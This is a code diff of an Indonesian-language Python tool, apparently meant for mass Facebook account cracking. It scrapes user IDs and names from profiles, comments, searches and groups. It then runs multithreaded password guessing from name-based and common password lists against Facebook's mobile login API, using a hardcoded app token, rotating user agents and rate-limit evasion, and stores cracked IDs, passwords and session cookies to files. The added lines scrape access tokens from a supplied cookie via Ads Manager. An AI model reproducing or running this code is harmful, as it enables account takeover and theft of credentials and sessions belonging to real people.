-			# common = open("asset/nama_indonesia","r").read().splitlines()
-			# for idt in user.split(","):
-			# 	self.id.append(idt)
-			# 	for people in common:
-			# 		self.id.append(people+" "+idt)
-			# Custom = [" xyz"," xd"," muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya"," kirana"]
-			# custoM = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak ","kirana "]
-			Custom = []
-			custoM = []
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			for asu in user:
-				for endd in Custom:
-					dump = asu+endd
-					username.append(dump)
-				for pornhub in custoM:
-					dump = pornhub+asu
-					username.append(dump)
-			try:
-				for gas in username:
-					Dump(cookie).Dump_Pencarian(f"https://mbasic.facebook.com/public/{gas}")
-			except:pass
-			Crack().atursandi()
-		
-		###----------[ MEMBER GRUP ]---------- ###
-		elif menu in["6","06"]:
-			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=87,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id grup : ")
-			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
-			Crack().atursandi()
-			
-		###----------[ FILE MASSAL ]---------- ###
-		elif menu in["7","07"]:
-			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=87,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan tempat file : ")
-			Dump(cookie).Dump_File(user)
-			Crack().atursandi()
-
-		###----------[ PINDAH KE MENU BOT ]---------- ###
-		elif menu in["BOT","Bot","bot"]:
-			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
-		###----------[ OPSI CHECKPOINT ]-------------###
-		elif menu in["8","08"]:
-			file_cp()
-			
-		###----------[ PINDAH KE MENU LAIN ]---------- ###
-		elif menu in["LAIN","Lain","lain"]:
-			Lain(cookie).menu()
-			
-		else:
-			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
-			
-###----------[ BAGIAN DUMP ]---------- ###
-class Dump:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self,cookie):
-		self.cookie = cookie
-			
-	###----------[ GET USER SENDIRI ]---------- ###
-	def GetUser(self):
-		try:
-			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
-			uid = re.findall('name="target" value="(.*?)"',url)[0]
-			return uid
-		except:
-			pass
-
-	###----------[ DUMP ID PUBLIK ]---------- ###
-	def Dump_Publik(self,url):
-		try:
-			url = parser(ses.get(url,cookies=self.cookie).text,"html.parser")
-			for z in url.find_all("a",href=True):
-				if "fref" in z.get("href"):
-					if "/profile.php?id=" in z.get("href"):uid = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")));nama = z.text
-					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for x in url.find_all("a",href=True):
-				if "Lihat Teman Lain" in x.text:
-					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
-		except:pass
-			
-	###----------[ DUMP KOMENTAR ]---------- ###
-	def Dump_Komentar(self,url):
-		try:
-			data = parser(ses.get(url).text,"html.parser")
-			for isi in data.find_all("h3"):
-				for ids in isi.find_all("a",href=True):
-					if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
-					else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
-					nama = ids.text
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for z in data.find_all("a",href=True):
-				if "Lihat komentar sebelumnya…" in z.text:
-					self.Dump_Komentar("https://mbasic.facebook.com"+z["href"])
-		except:pass
-		
-	###----------[ DUMP PENCARIAN NAMA ]---------- ###
-	def Dump_Pencarian(self,url):
-		try:
-			data = parser(ses.get(str(url)).text,'html.parser')
-			for z in data.find_all("td"):
-				namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
-				for uid,nama in namp:
-					if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
-					elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for x in data.find_all("a",href=True):
-				if "Lihat Hasil Selanjutnya" in x.text:
-					self.Dump_Pencarian(x.get("href"))
-		except:pass
-		
-	###----------[ DUMP MEMBER GRUP ]---------- ###
-	def Dump_MemberGrup(self,url):
-		try:
-			data = parser(ses.get(url,cookies=self.cookie,headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
-			judul = re.findall("<title>(.*?)</title>",str(data))[0]
-			for isi in data.find_all("h3"):
-				for ids in isi.find_all("a",href=True):
-					if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
-					else:
-						if ids.text==judul:pass
-						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for x in data.find_all("a",href=True):
-				if "Lihat Postingan Lainnya" in x.text:
-					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
-		except:pass
-		
-	###----------[ DUMP FILE ]---------- ###
-	def Dump_File(self,lok):
-		try:
-			file = open(lok,"r").read().splitlines()
-			for z in file:
-				tampung.append(z)
-		except:pass
-		
-	###----------[ DUMP FILE ]---------- ###
-	def Dump_Email(self,nama,limit):
-		try:
-			for z in range(int(limit)):
-				email = nama+str(z)+"@gmail.com<=>"+nama
-				if email in tampung:pass
-				else:tampung.append(email)
-		except:pass
-
-###----------[ BAGIAN CRACK ]---------- ###
-class Crack:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self):
-		self.loop = 0
-		self.ok = []
-		self.cp = []
-		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
-		
-	###----------[ ATUR SANDI DAN METODE ]---------- ###
-	def atursandi(self):
-		prints(Panel(f"""{P2}    berhasil mengumpulkan {len(tampung)} id""",width=87,padding=(0,21),style=f"{color_panel}"))
-		set = console.input(f" {H2}• {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
-		
-		###----------[ SANDI MANUAL ]---------- ###
-		if set in["Y","y"]:
-			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=87,style=f"{color_panel}"))
-			pwx = console.input(f" {H2}• {P2}buat katasandi : ").split(",")
-			if len(pwx)<=5:
-				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=87,style=f"{color_panel}"))
-				exit()
-			self.manual(pwx)
-		
-		###----------[ SANDI OTOMATIS ]---------- ###
-		else:
-			self.otomatis()
-		
-	###----------[ CRACK MANUAL ]---------- ###
-	def manual(self,pw):
-		global prog,des
-		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}% ]'))
-		des = prog.add_task('',total=len(tampung))
-		with prog:
-			with ThreadPoolExecutor(max_workers=30) as fall:
-				self.simpan_hasil()
-				for data in tampung:
-					user = data.split("<=>")[0]
-					nama = data.split("<=>")[1]
-					pwx = pw
-					fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
-		sys.exit()
-						
-	###----------[ CRACK OTOMATIS ]---------- ###
-	def otomatis(self):
-		global prog,des
-		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}% ]'))
-		des = prog.add_task('',total=len(tampung))
-		with prog:
-			with ThreadPoolExecutor(max_workers=30) as fall:
-				self.simpan_hasil()
-				for data in tampung:
-					try:
-						pwx = []
-						user = data.split("<=>")[0]
-						nama = data.split("<=>")[1]
-						depan = nama.split(" ")[0]
-						if len(nama)<=5:
-							if len(depan)<3:
-								pass 
-							else:
-								pwx.append(depan+"123")
-								pwx.append(depan+"321")
-								pwx.append(depan+"1234")
-								pwx.append(depan+"12345")
-								pwx.append("ganteng")
-								pwx.append("sayangku")
-								pwx.append("ganteng123")
-								pwx.append("katasandi")
-								pwx.append("freefire")
-								pwx.append("freefire123")
-								pwx.append("bandung123")
-								pwx.append("jakarta123")
-								pwx.append("surabaya123")
-								pwx.append("doraemon")
-								pwx.append("santri123")
-								pwx.append("pasuruan123")
-								pwx.append("malang123")
-								pwx.append("qwerty123")
-								pwx.append("indonesia")
-								pwx.append("arema1987")
-								pwx.append("persija123")
-								pwx.append("persib123")
-								pwx.append("iloveyou")
-						else:
-							if len(depan)<3:
-								pwx.append(nama)
-								pwx.append(nama+"123")
-								pwx.append(nama+"321")
-								pwx.append(nama+"1999")
-								pwx.append(nama+"1998")
-							else:
-								pwx.append(nama)
-								pwx.append(depan+"123")
-								pwx.append(depan+"321")
-								pwx.append(depan+"1234")
-								pwx.append(depan+"12345")
-								pwx.append("password")
-								pwx.append("kata sandi")
-								pwx.append("free fire")
-								pwx.append("free fire123")
-							belakang = nama.split(" ")[1]
-							if len(belakang)<3:
-								pwx.append(depan+belakang)
-								pwx.append(depan+belakang+"123")
-								pwx.append(depan+belakang+"321")
-								pwx.append(depan+belakang+"1234")
-								pwx.append(depan+belakang+"12345")
-							else:
-								pwx.append(depan+belakang)
-								pwx.append(belakang+"123")
-								pwx.append(belakang+"321")
-								pwx.append(belakang+"1234")
-								pwx.append(belakang+"12345")
-								pwx.append("kontol")
-								pwx.append("kontol123")
-								pwx.append("bismillah")
-								pwx.append("mobile legends")
-								pwx.append("domino123")
-						fall.submit(self.metode_api,user,pwx)
-					except:
-						fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
-		sys.exit()
-							
-	###----------[ METODE API ]---------- ###
-	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {H2}• {P2}[{H2}Mvb🌻{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
-		prog.advance(des)
-		try:
-			for pw in pwx:
-				pw = pw.lower()
-				ua = random.choice(ugent)
-				params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": {random.randint(1,26)}, 
-					"email": email,
-					"locale": "en_US",
-					"password": pw,
-					"sdk": "android",
-					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
-				}
-				headers = {
-					"Host": "graph.facebook.com",
-					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
-					"x-fb-sim-hni": str(random.randint(20000, 40000)),
-					"x-fb-net-hni": str(random.randint(20000, 40000)),
-					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": ua,
-					"content-type": "application/x-www-form-urlencoded",
-					"x-fb-http-engine": "Liger"
-				}
-				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
-				if "session_key" in post.text and "EAA" in post.text:
-					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
-					user = re.findall("c_user=(\d+)",coki)[0]
-					if user in self.ok or user in self.cp:
-
-						break
-					else:
-						self.ok.append(user)
-						tree = Tree(" ",guide_style=f"{color_ok}")
-						tree.add(Panel(f"{H2}       Succes-Login{P2}",width=30,padding=(0,2),style=f"{color_ok}"))
-						tree.add(f"\r{P2}User ID {P2}  : {H2}{user}")
-						tree.add(f"{P2}Password {P2} : {H2}{pw}")
-						tree.add(Panel(f"{H2}{coki}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
-						tree.add(Panel(f"{H2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
-						prints(tree)
-						#print('\n')
-						#Console(width=87).print(Panel(f"[bold green]{coki}", style='bold green'),justify='left')
-						#print('\n')
-						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
-						break
-				elif "User must verify their account" in post.text:
-					user = post.json()["error"]["error_data"]["uid"]
-					if user in self.ok or user in self.cp:
-						break
-					else:
-						self.cp.append(user)
-						tree = Tree(" ",guide_style=f"{color_cp}")
-						tree.add(Panel(f"{K2}   Checkpoint-Login{P2}",width=30,padding=(0,2),style=f"{color_cp}"))
-						tree.add(f"\r{P2}User ID {P2}     : {K2}{user}")
-						tree.add(f"{P2}Password {P2}    : {K2}{pw}")
-						tree.add(Panel(f"{K2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_cp}"))
-						prints(tree)
-						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
-						break
-				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
-					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
-					prog.advance(des)
-					time.sleep(30)
-				else:continue
-		except ConnectionError:
-			time.sleep(30)
-			self.metode_api(user,pwx)
-		self.loop +=1
-
-	###----------[ PRINT SIMPAN HASIL ]---------- ###
-	def simpan_hasil(self):
-		prints(Panel(f"""\r     {P2}hasil crack {H2}ok{P2} tersimpan ke : {H2}OK/{self.hari_ini}.txt{P2}
-{P2}     hasil crack {K2}cp {P2}tersimpan ke : {K2}CP/{self.hari_ini}.txt{P2}""",width=87,padding=(0,10),style=f"{color_panel}"))
-		prints(Panel(f"""\r     {P2}Jika Tidak Ada Hasil Hidupkan Mode Pesawat 5 Detik {K2}!!!""",width=87,padding=(0,10),style=f"{color_panel}"))
-          
-###----------[ MENU LAIN ]---------- ###
-class Lain:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self,cookie):
-		self.cookie = cookie
-		self.file = []
-		self.listfile = []
-		
-	###----------[ MENU ]---------- ###
-	def menu(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema tools
-[{color_text}02{P2}]. get info akun target    [{color_text}05{P2}]. tampilkan info cookies
-[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}].{H2} Kembali {P2})""",width=87,padding=(0,7),style=f"{color_panel}"))
-		menu = console.input(f" {H2}• {P2}pilih menu : ")
-		if menu in["01","1"]:
-			self.cek_hasil()
-		elif menu in["04","4"]:
-			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
-		elif menu in["05","5"]:
-			self.tampil_cookie()
-		elif menu in["06","6"]:
-			Menu().menu()
-			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python run.py""",width=87,style=f"{color_panel}")))
-		else:
-			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
-
-	###----------[ CEK HASIL CRACK ]---------- ###
-	def cek_hasil(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack ok
-[{color_text}02{P2}]. lihat akun hasil crack cp""",width=87,padding=(0,20),style=f"{color_panel}"))
-		ask = console.input(f" {H2}• {P2}masukan pilihan : ")
-		if ask in["1","01"]:folder = "OK"
-		else:folder = "CP"
-		
-		###----------[ PILIH FILE ]---------- ###
-		dirs = os.listdir(folder)
-		prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=87,padding=(0,15),style=f"{color_panel}"))
-		num = 0
-		for fil in dirs:
-			num += 1
-			self.file.append(fil)
-			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
-			self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
-			self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
-			self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
-		console.print(Columns(self.listfile))
-		prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=87,style=f"{color_panel}"))
-		result = console.input(f" {H2}• {P2}masukan angka : ")
-		
-		###----------[ MULAI CEK ]---------- ###
-		try:
-			files = self.file[int(result)-1]
-			totalhasil = open(f"{folder}/{files}","r").read().splitlines()
-		except:
-			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=87,style=f"{color_panel}"))
-			exit()
-		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
-		prints(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=87,style=f"{color_panel}"))
-		for akun in totalhasil:
-			user = akun.split("|")[0]
-			pw = akun.split("|")[1]
-			tree = Tree(" ")
-			if folder=="OK":
-				cookie = akun.split("|")[2]
-				tree.add(f"\r{H2}{user}|{pw}{P2} ")
-				tree.add(f"{H2}{cookie}{P2}")
-			else:
-				tree.add(f"\r{K2}{user}|{pw}{P2} ")
-			prints(tree)
-		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=87,padding=(0,7),style=f"{color_panel}"))
-		exit()
-		
-	###----------[ GANTI WARNA TEMA ]---------- ###
-	def ganti_tema(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
-[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
-[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
-[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
-[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=87,padding=(0,7),style=f"{color_panel}"))
-		ask = console.input(f" {H2}• {P2}pilih tema : ")
-		if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
-		elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
-		elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
-		elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
-		elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
-		elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
-		elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
-		elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
-		elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
-		elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
-		open("data/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
-		prints(Panel(f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",width=87,padding=(0,6),style=f"{color_panel}"))
-		sys.exit()
-			
-	###----------[ TAMPILKAN COOKIE ]---------- ###
-	def tampil_cookie(self):
-		now = datetime.now()
-		hari = now.day+int(30)
-		if hari > 30:hari = hari-30
-		bulan = now.month+1
-		if bulan > 12:bulan = bulan-12
-		if now.month+1 > 12:tahun = now.year+1
-		data = date(year=tahun,month=bulan,day=hari)
-		aktif = data.strftime("%d %B %Y")
-		console.print(f" {H2}• {P2}aktif sampai : {aktif}")
-		prints(Panel(f"""{H2}{self.cookie.get('cookie')}""",width=87,style=f"{color_panel}"))
-		sys.exit()
-		
-###===============> [Opsi-Akun] <================###
-import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
-import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
-from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup as parser
-from threading import (Thread, Event)
-from time import sleep as jeda
-from datetime import datetime
-
-ct = datetime.now()
-n = ct.month
-bulan_ = ['January', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
-try:
-	if n < 0 or n > 12:
-		exit()
-	nTemp = n - 1
-except ValueError:
-	exit()
-
-current = datetime.now()
-hari = current.day
-bulan = bulan_[nTemp]
-tahun = current.year
-bullan = current.month
-
-waktu = ("%s-%s-%s"%(hari,bulan,tahun))
-bulan12 = {"01": "January", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
-
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-P = '\x1b[1;97m' # PUTIH
-J = '\033[38;2;255;127;0;1m' # ORANGE
-N = '\x1b[0m' # WARNA MATI
-acak = [M, H, K, B, U, O, P, J]
-warna = random.choice(acak)
-til ="\033[0m "
-
-def jalan(keliling):
-	for mau in keliling + '\n':
-		sys.stdout.write(mau)
-		sys.stdout.flush();jeda(0.03)
-		
-		
-ubah_pass = []
-pwbaru = []
-pwBaru = []
-ubahP = []
-
-def file_cp():
-	dirs = os.listdir('CP')
-	prints(Panel(f"""{P2}copy nama file hasil crack di bawah ini kemudian pastekan di bawah untuk cek opsi""",width=87,style=f"{color_panel}"))
-	for file in dirs:
-		prints(Panel(f"""{K2}{(file)}""",width=87,style=f"{color_panel}"))
+###----------[ CEK COKIS TOKEN ]----------###
+def login_baz():
+	os.system('clear')
+	banner()
+	print('━━'* 25)
+	cok = input(f'{k}Masukkan cookie :{h} ')
 	try:
-		prints(Panel(f"""{P2}copy nama file di atas kemudian tempel di bawah ini contoh {M2}: {H2}{waktu}.txt""",width=87,style=f"{color_panel}"))
-		opsi()
-	except IOError:
-		prints(Panel(f"""{M2}Tidak ada file untuk di cek silahkan crack dulu""",width=87,style=f"{color_panel}"))
-		Menu().menu()
-
-def opsi():
-	CP = ("CP/")
-	romi = console.input(f" {H2}• {P2}Tempel atau masukan nama file yang ingin di cek disini : ")
-	if romi == "":
-		prints(Panel(f"""{K2}isi yang benar""",width=87,style=f"{color_panel}"))
-		opsi()
+		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
+		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
+		find = re.findall('act=(.*?)&nav_source', link.text)
+		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);exit()
+		else:
+			for x in find:
+				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
+				took = re.search('(EAAB\w+)',xz.text).group(1)
+				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
+				exit(f"Token : {took} \ncookies aktif")
+	except Exception as e:exit(e)
+  
+#----------> BAGIAN-MENU    
+def menu():
 	try:
-		file_cp = open(CP+romi, "r").readlines()
-	except IOError:
-		exit(prints(Panel(f"""{P2}nama file{K2} {(romi)} {P2}tidak di temukan""",width=87,style=f"{color_panel}")))
-	prints(Panel(f"""{P2}sebelem melanjutkan hidupkan mode pesawat selama 10 detik""",width=87,style=f"{color_panel}"))
-	pw=console.input(f" {H2}• {P2}ubah password ketika tab yes y/n : ")
-	if pw in['y','Y']:
-		ubah_pass.append("ubah_sandi")
-		pw2=console.input(f" {H2}• {P2}Masukan Password baru :{H2} ")
-		if len(pw2) <= 5:
-			prints(Panel(f"""{K2}Sandi minimal 6 karakter""",width=87,style=f"{color_panel}"))
-		else:
-			pwbaru.append(pw2)
-	prints(Panel(f"""{P2}Total akun {M2}:{H2} {str(len(file_cp))}""",width=87,style=f"{color_panel}"))
-	nomor = 0
-	for fb in file_cp:
-		akun = fb.replace("\n","")
-		ngecek  = akun.split("|")
-		nomor+=1
-		#print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
-		prints(Panel(f"""{P2}[{H2}{(str(nomor))}{P2}] {P2}Cek sesi akun {K2}>=> {K2}{akun}""",width=87,style=f"{color_panel}"));jeda(0.10)
-		try:
-			mengecek(ngecek[0].replace("",""), ngecek[1])
-		except requests.exceptions.ConnectionError:
-			continue
-	print("\n")
-	Console(width=30).print(Panel(f"[bold green]SELESAI MENGECEK OPSI", style='red'),justify='left')
-	console.input(f" {H2}• {P2}Tekan Enter")
-	#console.input("%s%s%s [%s Tekan Enter Untuk Kembali%s ] "%(U,til,O,U,O))
-	Menu().menu()
-	
-data = {}
-data2 = {}
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except (IOError,KeyError,FileNotFoundError):
+		baz_anim(f'{mer}cookies telah kadaluarsa bro')
+		waktu(4)
+		login_baz()
+	try:
+		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
+		nama = info_datafb["name"]
+		uidfb = info_datafb["id"]
+	except requests.exceptions.ConnectionError:
+		exit(f"\n{P} [:] Tidak ada koneksi{P}")
+	except KeyError:
+		try:os.remove(".cok.txt");os.remove(".token.txt")
+		except:pass
+		login_baz()
+	os.system('clear')
+	banner()
+	print('━━'* 25)
+	print(f'{xxx}┗━ 1.CRACK PUBLIK\n┗━ 2.DUMP FILE\n┗━ 3.CRACK MASSAL\n┗━ 4.HAPUS PRAWAN')
+	print('━━'* 25)
+	CO = input(f'┗━ 𝙿𝙸𝙻𝙸𝙷 𝚃𝙾𝙳 : ')
+	print('━━'* 25)
+	if CO in ['1','1']:
+		idt = input(f'┗━ 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳 : ')
+		dump(idt,"",{"cookie":cok},token)
+		atur_dulu()
+	elif CO in ['2','02']:
+		file_dump()
+	elif CO in ['3','03']:
+		nge_crack()
+	elif CO in ['exit','4','logout']:
+		hapus_cookie =	os.system('rm -rf .token.txt && rm -f .cok.txt')
+		baz_anim(f'[•] SUKSES HAPUS PRAWAN')
+		time.sleep(5)
+		login_baz()
 
-def mengecek(user,pw):
-	global loop,ubah_pass,pwbaru
-	session=requests.Session()
-	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
-	url = "https://mbasic.facebook.com"
